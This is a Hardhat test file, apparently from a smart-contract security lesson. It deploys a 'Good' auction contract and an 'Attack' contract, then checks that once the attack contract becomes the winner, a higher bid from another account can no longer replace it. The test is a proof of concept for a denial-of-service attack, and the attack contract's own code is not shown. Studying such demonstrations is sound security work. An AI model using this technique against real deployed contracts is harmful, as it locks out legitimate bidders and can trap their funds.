const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
    it("After being declared the winner, Attack.sol should not allow anyone else to become the winner", async function () {
        // deploy good contract
        const goodContract = await ethers.getContractFactory("Good");
        const _goodContract = await goodContract.deploy();
        await _goodContract.deployed();
        console.log("good contract address:", _goodContract);

        //deploy attack contract
        const attackContract = await ethers.getContractFactory("Attack");
        const _attackContract = await attackContract.deploy(_goodContract.address);
        await _attackContract.deployed();
        console.log("attack contract address", _attackContract.address);

        // Attack the good contract, get two addresses
        const [_, addr1, addr2] = await ethers.getSigners();

        // initially let addr1 become the current winner
        let tx = await _goodContract.connect(addr1).setCurrentAuctionPrice({
            value: ethers.utils.parseEther("1")
        })
        await tx.wait();

        //  Start the attack and make attack.sol the current winner
        tx = await _attackContract.attack({
            value: ethers.utils.parseEther("3.0")
        })
        await tx.wait();

        // Lets try to make addr 2 current winner
        tx = await _goodContract.connect(addr2).setCurrentAuctionPrice({
            value: ethers.utils.parseEther("4")
        })
        await tx.wait();

        // Check if the current winner is still attack contract
        expect(await _goodContract.currentWinner()).to.equal(_attackContract.address)
    })
})